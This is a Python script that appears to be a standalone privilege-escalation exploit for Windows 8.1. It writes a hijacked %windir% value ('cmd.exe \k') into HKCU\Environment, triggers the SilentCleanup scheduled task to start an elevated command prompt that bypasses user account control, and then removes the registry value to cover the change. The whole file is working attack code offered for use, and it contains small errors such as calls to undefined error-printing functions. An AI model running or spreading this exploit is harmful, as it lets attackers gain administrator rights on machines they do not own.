"""
Works from: Windows 8.1 (9600)
Fixed in:WINDOWS 10
TESTED IN WINDOWS 8.1 BUILDNUMBER(9600)
"""
import os
import time
import winreg
import subprocess
def silentcleanup():
        print("Hijacking %windir% enviroment variable in HKCU\Environment")
        try:
                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER,os.path.join("Environment"))
                winreg.SetValueEx(key,"windir",0,winreg.REG_SZ,"cmd.exe \k")
                winreg.CloseKey(key)
        except Exception as error:
                printerror("Unable to create %windir% enviroment variable in HKEY_CURRENT_USER\Environment")
        else:
                print("Successfully created %windir% enviroment variable in HKCU\Environment")

        print("Pausing for 5 seconds before executing")
        time.sleep(5)

        try:
                subprocess.call("schtasks /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I")
        except Exception as error:
                print_error("Unable to run schtask")
                
        print("Pausing for 5 seconds before cleaning")
        time.sleep(5)

        print("Removing %windir% enviroment variable")     
        try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,"Environment",0,winreg.KEY_ALL_ACCESS)
                winreg.DeleteValue(key,"windir")
        except Exception as error:
                print("Unable to remove %windir% enviroment variable")
                return False
        else:
                print("Successfully removed %windir% enviroment variable")
silentcleanup()
